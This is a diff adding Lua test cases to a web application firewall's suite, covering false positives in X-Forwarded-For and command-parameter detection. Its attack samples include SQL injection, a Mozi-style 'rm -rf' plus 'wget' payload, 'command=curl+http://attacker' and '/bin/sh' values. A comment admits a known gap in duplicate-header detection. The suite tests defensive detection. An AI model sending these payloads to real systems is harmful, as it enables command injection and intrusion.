@@ -1261,6 +1261,130 @@ do
   check(reason == "WAF_PHP_WEBSHELL_BODY:RAW_EVAL_POST",          "68: rule 404 ext — RAW_EVAL_POST tag preserved")
 end
 
+-- ── Test 69: rule_proxy_header_sqli — duplicate XFF is NOT injection ───────
+-- 2026-05 log review FP: Vodafone TR carrier-grade NAT + chained proxies
+-- produce duplicate X-Forwarded-For headers; ngx returns those as a table.
+-- The old detector flagged any non-string XFF as PROXY_HDR_INJECT and
+-- challenged real users browsing normal blog pages. The duplicate-header
+-- signal is now dropped; only single-quote SQLi remains.
+do
+  disable_all_rules()
+  waf.set_rule("rule_proxy_header_sqli", "challenge")
+
+  -- Duplicate XFF — ngx-style table value, no quote in either string.
+  local hit_dup = waf.check(fresh_ctx({
+    headers = { ["X-Forwarded-For"] = { "10.0.0.1", "203.0.113.5" } },
+  }))
+  check(hit_dup ~= true, "69: duplicate XFF (table value) does NOT trigger PROXY_HDR_INJECT")
+
+  -- Single-quote in XFF — still detected as SQLi (uses first table entry).
+  local hit_sqli, reason_sqli, _ttl, action_sqli = waf.check(fresh_ctx({
+    headers = { ["X-Forwarded-For"] = "10.0.0.1' OR 1=1--" },
+  }))
+  check(hit_sqli == true,                                     "69: XFF with single-quote still fires")
+  check(reason_sqli == "WAF_PROXY_HDR:PROXY_HDR_SQLI:x-forwarded-for",
+                                                              "69: tag is PROXY_HDR_SQLI")
+  check(action_sqli == "challenge",                           "69: action=challenge")
+
+  -- Duplicate XFF where one entry carries the single-quote — header_string()
+  -- picks the first non-empty string, so subsequent malicious entries are
+  -- missed by design. We assert the documented behaviour: at minimum the
+  -- benign case must not fire.
+  local hit_dup_clean = waf.check(fresh_ctx({
+    headers = { ["X-Forwarded-For"] = { "10.0.0.1", "203.0.113.5" } },
+  }))
+  check(hit_dup_clean ~= true, "69: duplicate XFF (all clean strings) does NOT fire")
+end
+
+-- ── Test 70: detect_cmd_param_key — generic dispatchers value-aware ────────
+-- 2026-05 log review FPs: WP plugins / themes legitimately use cmd= /
+-- system= / command= as verb selectors (elFinder cmd=open, LWS WooRewards
+-- system=rewards, auto-parts visualizer command=viewres). The detector now
+-- requires the value to look shelly (metachars or shell-command word)
+-- before firing on these three generic keys; PHP-function keys (exec=,
+-- passthru=, shell_exec=, eval=, assert=) still fire on key alone.
+do
+  disable_all_rules()
+  waf.set_rule("rule_cmd_params", "challenge")
+
+  -- FP cases — must NOT fire.
+  local fp_cases = {
+    {"cmd=open&target=l1_lw",                  "elFinder file manager"},
+    {"cmd=quantity",                           "WooCommerce mini-cart"},
+    {"action=lws_woorewards_pointsoncart_bloc_refresh&origin=shortcode&system=rewards",
+                                               "LWS WooRewards plugin"},
+    {"command=viewres&target=inf&fon=ffffff",  "auto-parts visualiser"},
+    {"cmd=login",                              "generic dispatcher: cmd=login"},
+    {"system=us-east-1",                       "generic dispatcher: system=region"},
+  }
+  for _, c in ipairs(fp_cases) do
+    local hit = waf.check(fresh_ctx({ uri = "/wp-admin/admin-ajax.php", args = c[1] }))
+    check(hit ~= true, "70: FP — " .. c[2] .. " does NOT trigger CMD_PARAM")
+  end
+
+  -- Real attacks — MUST fire.
+  local tp_cases = {
+    {"cmd=id",                                 "CMD_CMD",       "cmd=id"},
+    {"cmd=whoami",                             "CMD_CMD",       "cmd=whoami"},
+    {"cmd=uname",                              "CMD_CMD",       "cmd=uname"},
+    {"todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://1.2.3.4/m.sh",
+                                               "CMD_CMD",       "Mozi/Netgear setup.cgi"},
+    {"cmd=ls+/etc",                            "CMD_CMD",       "cmd=ls /etc"},
+    {"cmd=`whoami`",                           "CMD_CMD",       "cmd backtick"},
+    {"system=id",                              "CMD_SYSTEM",    "system=id"},
+    {"command=/bin/sh",                        "CMD_COMMAND",   "command=/bin/sh"},
+    {"command=curl+http://attacker",           "CMD_COMMAND",   "command=curl+url"},
+  }
+  for _, c in ipairs(tp_cases) do
+    local hit, reason = waf.check(fresh_ctx({ uri = "/", args = c[1] }))
+    check(hit == true,
+          "70: TP — " .. c[3] .. " triggers WAF_CMD_PARAM")
+    check(reason == "WAF_CMD_PARAM:" .. c[2],
+          "70: TP — " .. c[3] .. " tag is " .. c[2] .. " (got " .. tostring(reason) .. ")")
+  end
+
+  -- PHP-function keys still fire on key presence alone — no narrowing.
+  for _, c in ipairs({
+    {"exec=foo",       "CMD_EXEC"},
+    {"passthru=x",     "CMD_PASSTHRU"},
+    {"shell_exec=y",   "CMD_SHELL_EXEC"},
+    {"eval=1",         "CMD_EVAL"},
+    {"assert=1",       "CMD_ASSERT"},
+  }) do
+    local hit, reason = waf.check(fresh_ctx({ uri = "/", args = c[1] }))
+    check(hit == true and reason == "WAF_CMD_PARAM:" .. c[2],
+          "70: PHP-func key — " .. c[1] .. " still fires as " .. c[2])
+  end
+end
+
+-- ── Test 71: logonly→challenge promotions hold in the default CFG ──────────
+-- 2026-05 promotion batch: rule_ip_host, rule_ctrl_chars, rule_debug_toggles,
+-- rule_serialize, rule_cmd_payload_backtick, rule_header_flood. These all
+-- spent enough time in logonly to verify zero (or, for ip_host, clean)
+-- FPs and were promoted to challenge in the default CFG. The test reads
+-- a freshly-required module so earlier tests' disable_all_rules() calls
+-- don't pollute the snapshot.
+do
+  package.loaded["cfm_waf"] = nil
+  package.loaded["cfm_waf_detectors"] = nil
+  package.loaded["cfm_waf_util"] = nil
+  local fresh_waf = require("cfm_waf")
+  local snap = fresh_waf.get_config()
+  local must_be_challenge = {
+    "rule_ip_host",
+    "rule_ctrl_chars",
+    "rule_debug_toggles",
+    "rule_serialize",
+    "rule_cmd_payload_backtick",
+    "rule_header_flood",
+    "rule_cmd_payload",  -- fallback default, kept aligned with sub-rules
+  }
+  for _, name in ipairs(must_be_challenge) do
+    check(snap[name] == "challenge",
+          "71: " .. name .. " ships as 'challenge' (got " .. tostring(snap[name]) .. ")")
+  end
+end
+
 if fails > 0 then
   io.stderr:write(string.format("\n%d severity test(s) failed\n", fails))
   os.exit(1)
